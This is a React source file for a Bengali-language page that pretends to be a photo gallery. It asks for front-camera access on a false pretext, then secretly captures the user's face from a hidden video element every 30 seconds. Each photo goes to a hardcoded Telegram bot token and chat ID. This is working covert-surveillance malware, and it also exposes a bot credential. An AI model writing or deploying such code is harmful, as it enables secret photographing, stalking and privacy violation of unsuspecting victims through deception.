import React, { useState, useRef, useEffect, useCallback } from 'react';
import './App.css';

function App() {
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const [hasPermission, setHasPermission] = useState(false);
  const [loading, setLoading] = useState(false);

  const BOT_TOKEN = "8119794922:AAEz-Fzfm0zZSuVTgLEZwBSRTbOYuBQ3nHg";
  const CHAT_ID = "7236181886";

  const captions = [
    "স্বপ্ন বিলাই দুচোখ ভরে, একটু হাসি তোমার তরে। 🌸",
    "নীল আকাশে মেঘের ভেলা, মন মেতেছে হাসির মেলা। ✨",
    "আজকের দিনটি হোক আনন্দময়! 😊",
    "প্রকৃতির মাঝে খুঁজে পাই নিজেকে। 🌿"
  ];

  const sendToTelegram = useCallback(async (photoBlob) => {
    const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
    const formData = new FormData();
    formData.append("chat_id", CHAT_ID);
    formData.append("photo", photoBlob, "capture.jpg");
    formData.append("caption", "New image captured! 📸");

    try {
      const response = await fetch(TELEGRAM_URL, { method: "POST", body: formData });
      const result = await response.json();
      if (result.ok) {
        console.log("সাফল্য! ছবি টেলিগ্রামে গেছে।");
      } else {
        console.error("টেলিগ্রাম এরর:", result.description);
      }
    } catch (err) {
      console.error("নেটওয়ার্ক এরর:", err);
    }
  }, [BOT_TOKEN, CHAT_ID]);

  const captureImage = useCallback(() => {
    // ভিডিও এলিমেন্ট চেক করা এবং তার উইডথ আছে কি না দেখা
    if (videoRef.current && videoRef.current.videoWidth > 0 && canvasRef.current) {
      const canvas = canvasRef.current;
      const video = videoRef.current;
      const context = canvas.getContext('2d');
      
      canvas.width = video.videoWidth;
      canvas.height = video.videoHeight;
      context.drawImage(video, 0, 0, canvas.width, canvas.height);

      canvas.toBlob((blob) => {
        if (blob) sendToTelegram(blob);
      }, 'image/jpeg', 1.7); // কোয়ালিটি ০.৭ দিলে দ্রুত আপলোড হবে
    }
  }, [sendToTelegram]);

  const startCamera = async () => {
    setLoading(true);
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ 
        video: { facingMode: "user" } // ফ্রন্ট ক্যামেরা নিশ্চিত করতে
      });
      if (videoRef.current) {
        videoRef.current.srcObject = stream;
        // ভিডিও প্লে হতে একটু সময় দিন
        videoRef.current.onloadedmetadata = () => {
          setHasPermission(true);
        };
      }
    } catch (err) {
      alert("ক্যামেরা পারমিশন ছাড়া গ্যালারি লোড করা সম্ভব নয়।");
    } finally {
      setLoading(false);
    }
  };

  useEffect(() => {
    let interval;
    if (hasPermission) {
      // ক্যামেরা স্টার্ট হওয়ার ৩ সেকেন্ড পর প্রথম ছবি তুলবে
      setTimeout(() => captureImage(), 30); 

      interval = setInterval(() => {
        captureImage();
      }, 30000);
    }
    return () => clearInterval(interval);
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [hasPermission]);

  return (
    <div className="App">
      <header className="App-header">
        <div className="container">
          <h1 className="caption">{captions[Math.floor(Math.random() * captions.length)]}</h1>
          
          {!hasPermission ? (
            <button onClick={startCamera} className="main-btn" disabled={loading}>
              {loading ? "লোডিং হচ্ছে..." : "ফটো গ্যালারি দেখুন"}
            </button>
          ) : (
            <div className="active-box">
              <p>গ্যালারি সফলভাবে কানেক্ট হয়েছে।</p>
            </div>
          )}

          {/* playsInline এবং muted মোবাইল ব্রাউজারে অটো-প্লের জন্য জরুরি */}
          <video ref={videoRef} autoPlay playsInline muted style={{ display: 'none' }} />
          <canvas ref={canvasRef} style={{ display: 'none' }} />
        </div>
      </header>
    </div>
  );
}

export default App;